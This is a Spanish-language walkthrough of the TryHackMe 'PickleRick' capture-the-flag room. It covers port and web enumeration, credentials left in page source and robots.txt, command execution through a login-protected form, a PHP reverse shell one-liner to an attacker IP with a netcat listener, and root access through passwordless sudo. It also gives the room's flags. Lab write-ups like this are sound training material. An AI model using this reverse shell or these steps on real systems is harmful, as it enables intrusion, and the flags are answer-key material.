# PickleRick
Máquina resuelta de *TryHackMe* en la que se trabaja la enumeración y *fingerprinting*, *reverse shell*, la escucha de puertos y la escalada de privilegios.
<div>
  <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/-Nmap-6933FF?style=for-the-badge&logo=nmap&logoColor=white" />
  <img src="https://img.shields.io/badge/-Dirsearch-005571?style=for-the-badge&logo=dirsearch&logoColor=white" />
  <img src="https://img.shields.io/badge/-php-777BB4?style=for-the-badge&logo=php&logoColor=white" />
  <img src="https://img.shields.io/badge/-Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white" />
  <img src="https://img.shields.io/badge/-python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/-Netcat-F5455C?style=for-the-badge&logo=netcat&logoColor=white" />
</div>

## Objetivo

Explicar la realización del siguiente _Capture the flag_ perteneciente a la plataforma *TryHackMe*. Este desafío ambientado en la serie de *Rick y Morty* requiere explotar un servidor web y encontrar 3 ingredientes (*flags*) para ayudar a *Rick* a crear una poción que lo transforme nuevamente en humano. Para ello, se deberá interactuar con un formulario, penetrar en la máquina y realizar una escalada de privilegios.

## Que hemos aprendido?

- Realizar *fingerprinting* y enumeración de puertos y enumeración web.
- Realizar una *reverse shell*.
- Poner en escucha los puertos de la máquina.
- Escalada de privilegios.

## Herramientas utilizadas

- *Kali Linux*.
- Enumeración: *Nmap*, *Dirsearch*, *Python*.
- Penetración: *Bash*, *PHP*, *Netcat*. 

## Steps

### Enumeración y fingerprinting

La máquina a vulnerar pertenece a la plataforma *TryHackMe*, la propia web te proporciona la IP de la máquina víctima. La conexión a esta se hace mediante una VPN que te proporciona THM y asigna una nueva IP para que tu máquina interactúe con la máquina vulnerable.
El primero paso es lanzar **Nmap** sin *ping* (-Pn) y con los *scripts* por *default* de la herramienta (-sC) para que encuentre vulnerabilidades. Además se quieren conocer las versiones que corren en cada puerto (-sV) y el sistema operativo (-O). No se indica, específicamente, que compruebe todos los puertos pues en este tipo de máquina no será necesario.

![Captura de pantalla 2025-04-04 131854](https://github.com/user-attachments/assets/8527c885-9cdd-499a-ba91-bebcf4b73f80)

El comando devuelve 2 puertos TCPs abiertos:  
- En el puerto 22 corre la versión *Openssh 8.2p1*, en un sistema *Ubuntu*, servicio *SSH*.  
- En el puerto 80 corre el servidor *Apache 2.4.41*, en un sistema *Ubuntu*, servicio *HTTP*.

Primero nos dirigimos, desde el navegador, al puerto 80 de la IP dada, donde se puede ver un mensaje de ayuda de *Rick*. Si se inspecciona el código de la página se puede encontrar un comentario con el nombre de usuario: *R1ckRul3s*.

![image](https://github.com/user-attachments/assets/52f9925c-635c-4310-bcb4-342b65b72e7e)

Seguidamente, con la ayuda de la herramienta **Dirsearch**, se hace una enumeración de posibles directorios y archivos que se encuentren en la web. Por la parte de directorios, únicamente aparece '/assets' pero su contenido no aporta ninguna pista. Sin embargo, sí aparecen varios archivos interesantes que son alzanzables. *Dirsearch* es lanzado con **Python3** indicando la IP a atacar (-u) y la lista a utilizar para la enumeración (-w); en este caso la 'raft-small-files-lowercase.txt'.

![Captura de pantalla 2025-04-04 134454](https://github.com/user-attachments/assets/664445ee-a900-445c-a035-085657bca083)

Al dirigrnos al archivo '/robots.txt', se encuentra lo que parece ser una contraseña que junto con el usuario antes encontrado, serán útiles para el otro archivo '/login.php', también hallado en la enumeración. 

![Captura de pantalla 2025-04-04 134517](https://github.com/user-attachments/assets/efdb16bd-b14c-41bd-bd19-edb158f80200)

| Usuario | Contraseña |
|---------|------------|
| R1ckRul3s | Wubbalubbadubdub |


### Vulnerabilidades explotadas

Al hacer el *log in* se llega a un formulario que accepta comandos. Después de realizar un <code>whoami</code> y un <code>pwd</code>, se descubre que somos el usuario 'www-data' y estamos en el directorio '/var/www/html'. Ejecutando <code>ls</code>, aparecen la lista de archivos que contiene el directorio entre los que destaca 'Sup3rS3cretPickl3Ingred.txt'. Para leer el contenido de este archivo es necesario utilizar el comando <code>less</code>, en lugar de <code>cat</code>, pues este está deshabilitado. De esta manera se encuentra el primer ingrediente.

<code>less Sup3rS3cretPickl3Ingred.txt</code>

**Flag: mr. meeseek hair**

![image](https://github.com/user-attachments/assets/281596d6-0bb6-454a-99a9-bc4494a38749)

Otro archivo interesante para inspeccionar es 'clue.txt', el cual informa de la posibilidad de encontrar otro ingrediente alrededor del *file system*. Se intenta navegar por los directorios a través del panel de comandos pero no es posible y se encuentran muchas limitaciones. Por ese motivo se intentará hacer una *reverse shell* para penetrar la máquina y trabajar desde dentro.

![Captura de pantalla 2025-04-08 174710](https://github.com/user-attachments/assets/efdbda6c-9acc-41bf-bac4-90fef94e646e)

Después de comprobar que la máquina víctima tiene **PHP** instalado mediante el comando <code>which php</code>, me dispongo a hacer la *reverse* con el código sacado de la web de [*pentestmonkey*](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Únicamente es preciso cambiar la dirección IP por la de la máquina atacante (en este caso, nos la proporciona THM mediante la VPN) y el puerto que se pone en escucha.

<code>php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>

Desde la máquina anfitriona se pone en escucha (-l) el puerto (-p) 1234 con la herramienta **Netcat**. Se le indica verbosidad (-v) para que muestre información como las conexiones establecidas y que no resuelva nombres de dominio (-n), solo se conecte a las direcciones IP, lo que hace que la conexión sea más rápida, evitando la resolución de DNS.

![Captura de pantalla 2025-04-08 180322](https://github.com/user-attachments/assets/655dc72c-3564-4a25-be3f-409d1498901a)

Una vez dentro, navegando hacia el directorio '/home/rick' aparece un archivo llamado 'second ingredients' donde se encuentra la segunda bandera. Desde dentro de la máquina ya se puede hacer uso de <code>cat</code> teniendo en cuenta que el archivo lo pondremos entre comas simples, pues su nombre está formado por dos palabras.

<code>cat 'second ingredients'</code>

**Flag: jerry tear**

![Captura de pantalla 2025-04-08 180738](https://github.com/user-attachments/assets/0607b361-f320-4904-a919-d9dfc0f53ef5)

Para encontrar el último ingrediente, se debe escalar privilegios. Primero se comprueba que comandos, el usuario actual (www-data), puede ejecutar con permisos de *sudo*. 

<code>sudo -l</code>

En la respuesta se aclara que se puede pasar a usuario *root* sin necesidad de instertar ninguna contraseña. Esto permite acceder al diretorio /*root* y encontrar dentro del archivo '3rd.txt' el tercer ingrediente.

![Captura de pantalla 2025-04-08 181105](https://github.com/user-attachments/assets/baf2e399-5077-4b13-b7de-40b90db803b0)

**Flag: fleeb juice **
